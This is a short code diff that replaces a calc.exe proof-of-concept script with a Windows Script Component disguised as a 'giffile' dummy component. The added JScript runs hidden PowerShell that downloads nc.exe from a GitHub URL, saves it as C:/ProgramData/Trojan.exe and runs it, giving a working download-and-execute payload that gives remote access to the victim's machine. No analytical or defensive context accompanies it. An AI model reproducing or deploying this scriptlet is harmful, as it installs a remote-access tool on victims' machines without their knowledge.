@@ -1,4 +1,16 @@
-<script>
-a=new ActiveXObject("WScript.Shell");
-a.run('%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();
+<?XML version="1.0"?>
+<package>
+<component id='giffile'>
+<registration
+    description='Dummy'
+    progid="giffile"
+    version='1.00'
+    remotable='True'>
+</registration>
+<script language="JScript">
+<![CDATA[
+	new ActiveXObject('WScript.Shell').exec('%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'https://github.com/riyantigomez/gomez22/raw/master/nc.exe\', \'C:/ProgramData/Trojan.exe\'); C:/ProgramData/Trojan.exe');
+]]>
 </script>
+</component>
+</package>
